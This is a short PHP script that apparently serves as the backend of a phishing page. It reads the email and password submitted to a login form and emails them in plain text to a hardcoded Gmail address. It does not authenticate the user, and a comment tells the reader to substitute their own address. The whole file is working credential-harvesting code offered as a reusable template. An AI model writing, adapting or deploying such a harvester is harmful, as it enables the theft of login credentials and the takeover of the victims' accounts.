<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Prepare the email content
    $to = "oumaimamezni.isims@gmail.com";  // Replace with your email address
    $subject = "Login Data Submission";
    $message = "Email/Phone: " . $email . "\nPassword: " . $password;

    // Send the email
    if (mail($to, $subject, $message)) {
        echo "Data sent via email successfully!";
    } else {
        echo "Error: Email could not be sent.";
    }
}
?>
